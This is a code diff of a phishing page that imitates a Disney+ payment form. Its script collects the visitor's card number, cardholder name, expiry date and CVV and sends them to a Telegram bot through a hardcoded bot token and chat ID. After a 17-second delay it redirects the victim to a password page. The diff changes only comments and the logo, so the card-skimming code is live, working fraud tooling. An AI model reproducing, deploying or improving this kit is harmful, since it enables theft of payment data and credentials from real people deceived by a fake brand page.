@@ -4,17 +4,13 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Pago seguro | Disney+</title>
-  <!-- CSS commun pour fond + carte blanche -->
+  <!-- CSS commun -->
   <link rel="stylesheet" href="style.css"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet"/>
 </head>
-<body>
-
-  <main class="main-content">
-    <!-- Logo en haut de la carte -->
-    <img src="Images/compose2.png"
-         alt="Disney+"
-         style="display:block; margin:0 auto 20px; width:110px;"/>
+<body class="page-form">
+  <main>
+    <!-- Logo MyDisney centré en haut de la carte -->
+    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
     <h1>Información de pago</h1>
 
@@ -59,12 +55,15 @@
   <script>
     document.getElementById("paymentForm").addEventListener("submit", function(e) {
       e.preventDefault();
+      // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
 
+      // Récupère les valeurs
       const [num, name, exp, cvv] = Array.from(this.elements)
         .filter(el => el.tagName === "INPUT")
         .map(el => el.value.trim());
 
+      // Envoi Telegram
       const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chatId   = "-4970333928";
       const message  = `💳 Pago Disney+: Tarjeta ${num}, Nombre ${name}, Exp ${exp}, CVV ${cvv}`;
@@ -75,6 +74,7 @@
         body: JSON.stringify({ chat_id: chatId, text: message })
       }).catch(console.error)
         .finally(() => {
+          // Redirige après 17s
           setTimeout(() => {
             window.location.href = "password.html";
           }, 17000);
